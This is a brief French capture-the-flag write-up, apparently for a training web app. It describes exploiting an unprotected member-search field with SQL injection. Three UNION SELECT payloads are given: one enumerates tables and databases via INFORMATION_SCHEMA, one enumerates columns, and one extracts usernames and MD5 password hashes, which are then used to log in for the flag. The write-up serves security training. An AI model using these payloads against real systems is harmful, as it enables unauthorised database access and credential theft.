Sur la page de recherche de membre, l'input n'est pas protégé contre les injections SQL.
La commande `1 UNION SELECT table_name, table_schema FROM INFORMATION_SCHEMA.COLUMNS --` permet de récupérer la liste des tables ainsi que la DB correspondante.
Une seconde requete `1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS  --` liste toutes les colonnes.
A partir de ces informations, nous allons requêter dans la db Member_Brute_Force, la table db_default : `1 UNION SELECT username, password  FROM Member_Brute_Force.db_default --`
Le résultat nous donne deux usernames 'admin' et 'root' ainsi que leur password en MD5.
Le flag est trouvé en se loguant avec les identifiants trouvés